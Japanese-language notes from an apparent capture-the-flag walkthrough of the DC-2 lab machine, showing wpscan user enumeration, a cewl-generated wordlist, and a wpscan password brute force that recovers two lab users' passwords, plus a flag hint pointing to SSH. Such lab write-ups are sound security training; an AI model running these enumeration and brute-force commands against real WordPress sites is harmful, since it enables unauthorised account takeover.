〇wordpressの調査

・ユーザの列挙

wpscan --url http://dc-2 --enumerate u

\[i\] User(s) Identified:

\[+\] admin

\| Found By: Rss Generator (Passive Detection)

\| Confirmed By:

\|  Wp Json Api (Aggressive Detection)

\|   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1

\|  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

\|  Login Error Messages (Aggressive Detection)

\[+\] jerry

\| Found By: Wp Json Api (Aggressive Detection)

\|  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1

\| Confirmed By:

\|  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

\|  Login Error Messages (Aggressive Detection)

\[+\] tom

\| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

\| Confirmed By: Login Error Messages (Aggressive Detection)

![[webの調査② image.png]]

![[webの調査② image 1.png]]

admin、jerry、tomというユーザが判明

〇パスワードの特定

※wpscan --url http://dc-2 --passwords /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt --usernames jerry

上記を試すもヒント通り、通常のパスワードではうまくいかず

・ヒントにあった通りにcewlを実行する

CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

![[webの調査② image 2.png]]

・ブルートフォースの実行

wpscan --url http://dc-2 --passwords dc-2-passlist.txt --usernames jerry

![[webの調査② image 3.png]]

![[webの調査② image 4.png]]

jerryのパスワード：adipiscingが判明

![[webの調査② image 5.png]]

同様にtomのパスワード：parturientが判明

〇wordpress内の調査

![[webの調査② image 6.png]]

Flag２についてメモを発見

![[webの調査② image 7.png]]

If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.

※翻訳

WordPress を悪用してショートカットすることができない場合は、別の方法があります。 別のエントリポイントが見つかったことを願っています。

おそらくsshのことを指していると思われる